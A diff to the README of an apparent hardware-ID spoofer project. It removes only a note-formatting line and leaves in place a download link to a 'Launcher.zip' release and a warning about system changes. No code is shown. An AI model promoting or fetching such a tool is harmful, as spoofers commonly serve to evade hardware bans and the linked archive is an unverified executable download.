@@ -10,7 +10,6 @@
 
 [Download latest release](https://github.com/KookSpook24/hwid-spoofer/releases/download/hwid-spoofer/Launcher.zip)
 
-> [!NOTE]
 > Please note that the use of spoofer tools can lead to changes in your system settings. Always make sure to create a system restore point before making any changes to your system. Use them responsibly! 😊
 
 # Features
